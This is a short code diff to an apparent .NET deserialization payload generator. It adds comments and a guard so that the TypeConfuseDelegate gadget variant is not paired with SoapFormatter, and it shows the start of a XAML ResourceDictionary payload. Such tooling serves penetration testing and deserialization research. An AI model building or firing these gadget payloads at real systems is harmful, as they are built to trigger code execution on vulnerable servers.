@@ -20,7 +20,11 @@ namespace ysonet.Generators
         {
             return new List<GadgetVariant>
             {
-                new GadgetVariant(1, "TypeConfuseDelegate wrapper (default)"),
+                // Variant 1 wraps the XAML in TypeConfuseDelegate, whose gadget object
+                // is a generic SortedSet<string>. SoapFormatter cannot serialize a
+                // generic type, so this variant opts out of SoapFormatter (variant 2,
+                // TextFormattingRunProperties, is not generic and serializes fine).
+                new GadgetVariant(1, "TypeConfuseDelegate wrapper (default)").Without(Formatters.SoapFormatter),
                 new GadgetVariant(2, "TextFormattingRunProperties wrapper")
             };
         }
@@ -54,6 +58,10 @@ namespace ysonet.Generators
 
         public override object Generate(string formatter, InputArgs inputArgs)
         {
+            // Reject an impossible variant+formatter pair (e.g. variant 1 + SoapFormatter)
+            // with a clear message instead of a deep framework exception.
+            GuardVariantFormatter(variant_number, formatter);
+
             string xaml_payload = @"<ResourceDictionary
 xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
 xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
@@ -93,6 +101,8 @@ xmlns:r=""clr-namespace:System.Reflection;assembly=mscorlib"">
             object payload;
             if (variant_number == 1)
             {
+                // TypeConfuseDelegate wrapper: a generic SortedSet<string> (see
+                // GetXamlGadget), so SoapFormatter is opted out for this variant above.
                 payload = TypeConfuseDelegateGenerator.GetXamlGadget(xaml_payload);
             }
             else
